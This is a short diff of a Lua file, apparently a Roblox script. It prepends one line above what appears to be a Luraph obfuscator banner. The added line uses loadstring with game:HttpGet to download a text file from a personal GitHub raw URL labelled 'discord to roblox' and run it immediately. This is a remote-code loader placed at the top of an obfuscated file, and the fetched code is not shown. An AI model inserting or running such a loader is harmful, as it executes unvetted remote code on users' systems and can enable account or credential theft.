@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/houseguynew/misc-scripts/refs/heads/main/discord%20to%20roblox.txt"))()
+
 --[[
  .____                  ________ ___.    _____                           __                
  |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
